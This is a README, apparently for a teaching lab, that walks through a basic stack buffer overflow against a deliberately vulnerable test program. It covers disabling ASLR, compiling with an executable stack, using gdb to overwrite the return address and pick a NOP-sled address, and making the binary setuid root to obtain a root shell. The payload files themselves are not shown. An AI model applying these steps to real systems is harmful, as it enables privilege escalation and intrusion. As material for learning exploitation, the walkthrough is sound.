Basic buffer overflow example with shellcode and setuid for root shell.

Perform the below instructions  with a non root user (you will need sudo  
or root for some commands):

I've wrote and tested this code on a VM running: Ubuntu 12.04.4 LTS i686

1. Test ALSR is disabled:
   * See ../common/README.md on esp.c
5. Compile test vulnerable program: 
   * gcc -g -z execstack -o bo1 bo1.c
6. Test with no overflow: 
   * ./bo1 A
7. Test with overflow: 
   * ./bo1 $(cat e1)
8. Test we can overwrite return address value: 
   * cat e2
   * gdb ./bo1
   * break 10
   * r $(cat e2)
   * info registers
   * x/40x $esp 
   * The bottom of stack ($ebp) should contain 4321 (we can
     overwrite $eip !!!)
9. Run exploit and select NOP address to replace in exploit file:
   * cat e3
   * gdb ./bo1
   * break 10
   * r $(cat e3)
   * info registers
   * x/40x $esp
   * Select an address in the middle x90 (NOP)
10. Update exploit b3 python script with chosen address (variable eip)
11. Run exploit and get shell from gdb (no root since we run gdb as non root user)
    * gdb ./bo1
    * r $(cat e4) 
12. Setuid and run without debugger:
    * sudo chown root bo1
    * sudo chmod u+s bo1
    * gdb ./bo1 $(cat e4)
    * id (should be root) 
13. If exploit failed, it's because environment variables are on the stack and offset is wrong.  
Play with address in e4 with hexedit adding or removing 50 or 20 at a time until it works. A more 
resiliant method is to run gdb and non gdb exploits with an empty envionment like so:
    * env -i PWD="." SHELL="/bin/bash" SHLVL=0 gdb ./bo1 (remember unset env COLUMNS and unset env LINES)
    * env -i PWD="." SHELL="/bin/bash" SHLVL=0 ./vuln $(cat e4)
